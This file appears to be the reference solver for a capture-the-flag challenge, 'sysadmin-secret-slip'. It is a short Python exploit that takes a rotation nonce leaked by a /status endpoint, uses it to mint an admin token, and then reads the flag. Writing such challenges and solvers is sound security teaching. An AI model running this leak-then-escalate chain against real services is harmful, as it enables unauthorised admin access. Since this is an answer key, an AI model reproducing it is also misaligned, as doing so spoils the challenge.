#!/usr/bin/env python3
"""Reference solver for sysadmin-secret-slip.

/status leaks the pending rotation nonce; rotating with it mints and hands back a
fresh admin token, which reads the flag.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, headers=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    h = dict(headers or {})
    if data:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    nonce = _req(base + "/status")["pending_nonce"]
    token = _req(base + "/rotate", {"nonce": nonce}, method="POST")["admin_token"]
    return _req(base + "/admin/flag", headers={"X-Admin-Token": token})["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
